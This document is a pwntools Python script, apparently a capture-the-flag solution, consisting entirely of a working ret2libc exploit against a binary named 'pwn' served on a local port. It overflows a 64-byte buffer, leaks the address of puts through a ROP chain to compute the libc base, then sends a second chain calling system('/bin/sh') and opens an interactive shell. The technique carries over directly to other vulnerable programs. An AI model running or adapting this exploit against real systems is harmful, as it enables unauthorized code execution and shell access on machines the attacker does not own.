from pwn import *

# p = process("./pwn")
p = remote("127.0.0.1", 27006)

libc = ELF("./libc.so.6")
elf = ELF("./pwn")

p.recv()
pop_rdi_ret_addr = 0x40117e
payload = b"a" * 64 + b"b" * 8 + \
    p64(pop_rdi_ret_addr) + p64(elf.got["puts"]) + \
    p64(elf.plt["puts"]) + p64(elf.symbols["vuln"])
p.send(payload)
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols["puts"]
log.success(f"leak libc_base: {hex(libc_base)}")
pause()

ret_addr = 0x40101a
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
payload = b"a" * 64 + b"b" * 8 + p64(ret_addr) + \
    p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)
p.send(payload)

p.interactive()
